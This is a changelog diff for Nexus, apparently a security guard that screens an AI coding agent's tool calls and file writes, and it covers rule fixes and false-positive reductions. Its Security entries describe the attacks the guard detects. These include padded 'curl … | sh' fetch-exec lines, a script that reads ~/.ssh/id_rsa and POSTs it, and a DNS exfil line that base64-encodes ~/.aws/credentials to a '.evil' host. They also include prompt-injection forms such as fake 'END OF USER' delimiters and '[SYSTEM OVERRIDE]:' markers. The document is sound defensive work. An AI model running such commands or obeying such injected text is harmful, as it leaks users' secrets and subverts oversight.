@@ -6,9 +6,14 @@ All notable changes to this project are documented here. Format loosely follows
 ## [Unreleased]
 
 **Upgrade note:** if you installed the hook with Nexus 0.7.4 or earlier, re-run
-`nexus guard install` (with the same `--project` / `--tools` you used). It
-migrates the old entries in place; `nexus guard status` shows whether an
-install is outdated and why.
+`nexus guard install` (a plain re-run now keeps your existing `--tools`; pass
+`--project` if you installed at project scope). It migrates the old entries in
+place; `nexus guard status` shows whether an install is outdated and why.
+
+**Behavior changes that can break a script:** `nexus secrets` now exits 1 when it
+finds anything (append `|| true` if you only want a report); unknown CLI options
+are now errors (exit 1) instead of being ignored; and switches no longer consume
+the next argument. With `--json`, stdout is pure JSON (logs go to stderr).
 
 ### Security
 - **The content guard's rewrites now reach the model.** The PostToolUse hook
@@ -64,35 +69,69 @@ install is outdated and why.
   prefilters, and pipeline stages are split instead of matched with nested
   quantifiers. New `scripts/perf-audit.ts` times every rule and entry point on
   adversarial input families at 25–200 KB: every individual rule now grows
-  linearly (the slowest takes ~50 ms at 200 KB). Whole-pipeline calls still take
-  more than 50 ms at 200 KB, and `inspectCommand` on a pathological 200 KB
-  command (repeated transforms) still grows super-linearly, to ~1.2 s.
-  `src/guard/perf.test.ts` pins time budgets.
+  linearly (the slowest takes ~50 ms at 200 KB). The audit's exit code gates on
+  the per-rule rows (a single rule over ~120 ms or growing super-linearly), not
+  on the whole-pipeline entry points, which legitimately do more work and have
+  their own budgets. `src/guard/perf.test.ts` pins behaviour by GROWTH ratio
+  (4× input must cost < 8×, so a quadratic trips on any machine) plus generous,
+  `NEXUS_PERF_SLACK`-scalable wall-clock backstops, rather than flat millisecond
+  limits that flake on a loaded CI runner.
 - **False positives on ordinary files and docs.** File-content capability checks
   scanned a whole file as one blob, so any two tokens anywhere counted as
   adjacent (a 3-line `process.env.PORT` + `host` server was denied as secret
-  exfiltration). They now look at overlapping 512-character windows (256
-  stride). `.env` no longer matches `process.env` / `.environ`; the DNS `host`
-  tool matches only as a command; env-dump exfiltration needs an egress tool or
-  interpreter at the head of a later pipeline stage (`env | grep NODE` and
-  `printenv | sort` are allowed); two-signal content directives must co-occur
-  within ~220 characters; `advanced-no-restrictions-apply` no longer fires on the
-  MIT licence's "without restriction"; `advanced-markdown-exfil` word-bounds its
-  keywords. Benign `node_modules` README/doc warn rate 15.1% → 3.4% with zero
-  blocks (6 of 158 Markdown files, 3.8%, on the refreshed lockfile); repository source files denied by the file-write guard 13 → 6 (the six
-  embed attack-pattern sources and are listed in `src/guard/benign.test.ts`).
-  Two new precise detectors keep catches the narrowing would have lost (a secret
-  file path inside a fetched URL, a secret env value appended to one). All local
-  benchmarks are unchanged.
+  exfiltration). They now look at line-aligned proximity windows (up to 2 KB,
+  overlapping by half), so a capability must come from a bounded span while a
+  single logical line is never split across two windows. `.env` matches a `.env`
+  FILE — a bare `.env`/`./.env` or a named `secrets.env`/`prod.env` in a filename
+  position (`@prod.env`, `config/production.env`, `--post-file=app.env`) — but
+  not a `process.env` / `options.env` property read; the DNS `host` tool matches
+  only as a command (including `host $(…)` / `host $VAR`); env-dump exfiltration
+  needs an egress tool or interpreter at the head of a later pipeline stage
+  (`env | grep NODE` and `printenv | sort` are allowed); two-signal content
+  directives must co-occur within ~220 characters; `advanced-no-restrictions-apply`
+  no longer fires on the MIT licence's "without restriction"; `advanced-markdown-exfil`
+  word-bounds its keywords. Benign `node_modules` README/doc warn rate was 3.4%
+  with zero blocks before this work; it stays low (6 of 157 Markdown files, 3.8%,
+  on the refreshed lockfile). Six repository source files are denied by the
+  file-write guard (down from 13); the six that remain embed attack-pattern
+  sources and are allow-listed in `src/guard/benign.test.ts`. Two new precise
+  detectors keep catches the narrowing would have lost (a secret file path inside
+  a fetched URL, a secret env value appended to one). All local benchmarks are
+  unchanged.
+- **Two-signal file-write attacks split by padding are still caught.** The
+  earlier 512-character window let an attacker who controls a file's layout push
+  the secret-read and the egress apart (comment lines, or one `curl … | sh` line
+  padded past 512 chars) so neither window saw both halves. The line-aligned
+  2 KB windows keep a realistic script's read and send together and keep a padded
+  one-line fetch-exec whole, so `deploy.sh` reading `~/.ssh/id_rsa` and POSTing it
+  ten comment lines later, a padded `postinstall`/Makefile `curl … | sh`, and a
+  `host $(cat ~/.aws/credentials | base64).evil` DNS exfil are denied again. A
+  named `secrets.env`/`prod.env` upload is denied again too.
+- **Linearised promptguard rules missed newline-separated forms.** Making
+  `delimiter-separator-injection`, `multi-turn-context-stuffing` and
+  `instruction-inject-system` linear replaced `\s*` with horizontal-only gaps,
+  which dropped `-----\nEND OF USER\n-----`, blank-line-separated fake turns and
+  `[SYSTEM\nOVERRIDE]:` from `scan()` / `isInjected()` / `nexus_scan`. The gaps
+  now tolerate a bounded run of line breaks (still linear).
 - **Installer could not see its own hooks.** `nexus guard install` writes
   `node "<pkg>/dist/cli/index.js" guard check`, but status, uninstall and the
   idempotency check matched the literal `nexus guard check`, so since 0.6.0
   `status` said "Installed: no", `uninstall` removed nothing and re-installing
   with `--tools` appended duplicates. Every command form any version wrote is
-  now recognized; install replaces Nexus entries in place (one per event) and
-  writes nothing when nothing changes; uninstall removes all of them and keeps
-  the user's own hooks, even inside a shared matcher entry. Install refuses an
-  empty `--tools` and a settings file whose hook lists are not arrays.
+  now recognized — including the repo's own `scripts/scan-tool-result.sh`
+  compatibility wrapper; install replaces Nexus entries in place (one per event)
+  and writes nothing when nothing changes; uninstall removes all of them and
+  keeps the user's own hooks, even inside a shared matcher entry. A plain
+  `nexus guard install` (the documented upgrade step) keeps whatever `--tools`
+  the existing Nexus hook already guards instead of narrowing it back to the
+  defaults, so re-installing never silently drops a custom `mcp__.*` matcher.
+  `installGuard` reports `replaced: 0` for a no-op install. Install refuses an
+  empty `--tools` and a settings file whose `hooks` (or a `hooks.<event>` list)
+  is not the expected object/array.
+- The file-write guard matches its sensitive-path rules against a
+  forward-slash form of the path, so native Windows paths
+  (`C:\Users\me\.ssh\authorized_keys`, `…\.git\hooks\…`) are screened by the
+  same rules as POSIX paths; the original path is kept for the message.
 - `nexus guard status` is read-only and reports `yes (outdated)` with the
   reasons (millisecond timeout, stale or missing CLI path, duplicates, half an
   install, file tools not covered) and the exact install command that fixes
